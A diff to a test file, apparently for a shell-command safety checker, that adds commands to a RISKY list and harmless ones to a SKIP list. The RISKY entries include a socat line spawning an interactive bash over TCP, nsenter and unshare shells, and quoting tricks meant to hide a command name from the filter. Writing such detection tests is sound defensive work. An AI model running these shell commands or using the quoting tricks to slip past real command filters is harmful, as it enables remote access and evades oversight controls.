@@ -149,6 +149,14 @@ RISKY = [
         "yash dscl sysadminctl tmutil csrutil stack").split()),
     "rg --pre ./x.sh foo",
     "rg --pre=cat foo",
+    # scan round: tools that run or rewrite other things
+    "socat - EXEC:sh", "socat tcp:x:1 exec:'bash -i'", "socat - EXEC:rm", "x:rm f",
+    "ex -c '!ls' f", "view f", "rview f", "vimdiff a b", "strace ls", "ltrace ls",
+    "dtrace -n x", "nsenter -t 1 sh", "unshare -r sh", "taskset 1 ls", "ionice -c3 ls",
+    "chrt 1 ls", "gzip f", "gunzip f.gz", "bzip2 f", "xz f", "unxz f.xz", "7z x a.7z",
+    "link a b", "mktemp", "telnet h 23", "ftp h",
+    # quoting / backslash must not hide a command-position word
+    "\"ex\" -c x f", "'view' f", "\\view f", "e\\x f", "\"timeout\" 5 ls", "'nohup' ls",
 ]
 
 SKIP = [
@@ -192,6 +200,14 @@ SKIP = [
     "grep -n \"stack trace\" f",
     "ls ant/",
     "cat screen.txt",
+    "cat view.tsx",
+    "ls ex/",
+    "grep -n \"link\" f",
+    "rg -n view src",
+    "echo \"a:b\"",
+    "ls -la /tmp",
+    "grep -n \"look at this\" f",
+    "echo at batch",
 ]
 
 
